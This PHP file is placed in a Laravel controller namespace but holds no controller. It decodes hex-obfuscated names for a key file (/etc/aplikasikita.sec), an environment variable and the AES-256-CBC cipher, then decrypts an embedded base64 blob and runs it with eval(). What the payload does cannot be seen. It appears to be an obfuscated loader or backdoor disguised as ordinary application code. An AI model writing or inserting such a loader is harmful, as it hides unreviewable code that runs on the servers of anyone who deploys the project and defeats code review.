<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LaYS5Gj8tNmCP24YsbRSig==');

$c=base64_decode(

'wQAp2zUP3BT6zkg005t4IgSumKNVVKT3ZERrT1HNhqBzvTVLuNQbFWX2rpWwRH1vq2ff3rmL3xix' .
'mbmE72qyRk9QvyAqQ2biEjjUujoTjveKputQOIRzeo9HB7Q1/RYhtyzJ9vGV6J2d1pVQPR13cJWB' .
'AxQ6PJMIGs0kH+/LIZYGh9o7jvKbbivkUy/hA5FDD+doQY7tkUkt5luFsRpwxIrOmlINkw2+F+3a' .
'+uMSDhaa7LAJ6UxJrL7gTshqaXBKVLsdjtyxox9k1Y1COeML/xFNzrBKBc6f8D1sruTuYIyG9E+2' .
'YHNG0qR9ui9v17t7lH2arTNs001nHdXsDfjm0nGT8AjPRlhKEPxZEISQNxbRwBlMzKqxoZWxc1Uu' .
'SpGGY1aoeedwxVIXMNlG/wrKrw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

